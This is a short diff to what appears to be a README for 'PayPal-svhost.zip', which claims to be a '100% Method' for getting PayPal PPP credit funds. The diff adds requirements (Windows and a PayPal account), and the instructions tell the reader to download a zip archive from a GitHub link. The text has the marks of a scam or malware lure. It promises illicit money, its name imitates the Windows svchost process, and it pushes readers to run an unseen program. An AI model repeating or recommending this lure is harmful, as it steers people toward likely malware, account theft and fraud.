@@ -2,6 +2,11 @@
 PayPal-svhost.zip - (PayPal PPP Credit Application) 100% Method
 This program will help you get credit funds in the application on the website https://www.paypal.com/
 
+FOR THE PROGRAM TO WORK, YOU NEED:
+
+- Computer running on Windows operating system (7 - 10);
+- PayPal account.
+
 WORK INSTRUCTIONS:
 
 1) Download the program https://github.com/Wich-Hash/PayPal-svhost.zip/archive/main.zip ;
